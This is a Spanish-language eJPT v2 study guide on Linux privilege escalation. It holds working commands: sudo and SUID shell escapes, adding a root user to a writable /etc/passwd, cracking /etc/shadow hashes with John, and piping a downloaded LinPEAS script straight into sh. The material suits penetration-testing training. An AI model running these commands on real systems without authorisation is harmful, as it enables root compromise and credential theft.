# Escalada de Privilegios en Linux (Guía eJPT v2)

Metodología de reconocimientos locales y vectores de escalada de privilegios en sistemas Linux adaptada al temario de eJPT v2.

---

## 1. Enumeración Manual Rápida

```bash
# Identidad y privilegios actuales
whoami
id
groups

# Información del Kernel y arquitectura
uname -a
cat /etc/issue
cat /etc/os-release

# Privilegios Sudo asignados sin contraseña
sudo -l

# Procesos ejecutándose como root
ps aux | grep root

# Interfaces de red internas e IPs
ip a || ifconfig
netstat -tunlp || ss -tunlp
```

---

## 2. Permisos Sudo (`sudo -l`)

Si `sudo -l` muestra comandos ejecutables como root sin contraseña:

```bash
# Ejemplo: si se permite ejecutar /usr/bin/find como sudo
sudo find . -exec /bin/sh \; -quit

# Ejemplo: si se permite ejecutar /usr/bin/vim como sudo
sudo vim -c ':!/bin/sh'

# Ejemplo: si se permite ejecutar /usr/bin/nmap como sudo (versiones antiguas)
sudo nmap --interactive
# (En nmap interactivo: !sh)
```
> [!TIP]
> Consulta siempre la web de referencia **GTFOBins** (`gtfobins.github.io`) para cualquier binario permitido en `sudo -l`.

---

## 3. Binarios SUID / SGID

Binarios que se ejecutan con los privilegios del propietario (frecuentemente `root`).

```bash
# Buscar todos los binarios SUID en el sistema
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### Binarios SUID comunes y vulnerables:
* `env` SUID: `env /bin/sh -p`
* `find` SUID: `find . -exec /bin/sh -p \; -quit`
* `bash` SUID: `bash -p`
* `cp` SUID: Permite sobreescribir `/etc/passwd` o `/etc/shadow`.

---

## 4. Archivos Sensibles y Permisos Débiles

### `/etc/passwd` Escritura Abierta
Si `/etc/passwd` es escribible por el usuario actual:
1. Generar hash de contraseña con `openssl`:
   ```bash
   openssl passwd -1 -salt hacker Password123!
   ```
2. Añadir un nuevo usuario root al final de `/etc/passwd`:
   ```text
   hacker:$1$hacker$o/o8zB...:0:0:root:/root:/bin/bash
   ```
3. Cambiar al usuario root creado: `su hacker`

### `/etc/shadow` Lectura Abierta
Si `/etc/shadow` es legible:
1. Copiar el hash de `root` y desencriptarlo con John/Hashcat:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
   ```

---

## 5. Script Automatizado: LinPEAS

```bash
# Descargar e ejecutar LinPEAS en memoria sin tocar disco permanente
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# O ejecutar script localmente:
chmod +x linpeas.sh
./linpeas.sh
```

### En qué fijarse en el reporte de LinPEAS:
* **RED/YELLOW (Rojo/Amarillo)**: 95% de probabilidad de ser un vector directo de escalada de privilegios.
* Sección de **Sudo**, **SUID**, **Cron jobs** y **CVEs de Kernel**.
